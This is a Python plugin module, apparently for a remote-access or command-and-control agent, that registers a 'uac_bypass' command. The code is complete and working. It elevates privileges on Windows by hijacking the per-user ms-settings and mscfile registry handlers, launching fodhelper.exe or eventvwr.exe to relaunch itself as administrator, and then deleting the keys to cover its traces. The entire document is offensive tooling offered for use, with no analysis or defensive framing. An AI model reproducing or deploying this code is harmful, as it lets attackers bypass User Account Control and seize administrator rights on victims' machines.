PLUGIN = {"name": "uac_bypass", "desc": "UAC bypass for privilege escalation (fodhelper, eventvwr)", "deps": [], "size": 2.5}

STUB_CODE = r"""
import ctypes, sys

def _uac_fodhelper():
    import winreg
    try:
        cmd = sys.executable + " " + " ".join(sys.argv)
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        subprocess.Popen(["fodhelper.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _uac_eventvwr():
    import winreg
    try:
        cmd = sys.executable + " " + " ".join(sys.argv)
        key_path = r"Software\Classes\mscfile\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
        subprocess.Popen(["eventvwr.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\mscfile", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _cmd_uac_bypass(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] UAC bypass is Windows-only"}
        if ctypes.windll.shell32.IsUserAnAdmin():
            return {"output": "[+] Already running as admin"}
        method = m.get("method", "fodhelper")
        ok = None
        if method in ("fodhelper", "auto"):
            ok = _uac_fodhelper()
        if not ok and method in ("eventvwr", "auto"):
            ok = _uac_eventvwr()
        if ok:
            return {"output": f"[+] UAC bypass triggered via {method}, elevated process spawned", "_exit": True}
        return {"output": "[!] UAC bypass failed"}
    except Exception as e: return {"output": f"[!] UAC bypass error: {e}"}
_CMDS["uac_bypass"] = _cmd_uac_bypass
"""

def get_commands():
    return {"uac_bypass": "_cmd_uac_bypass"}
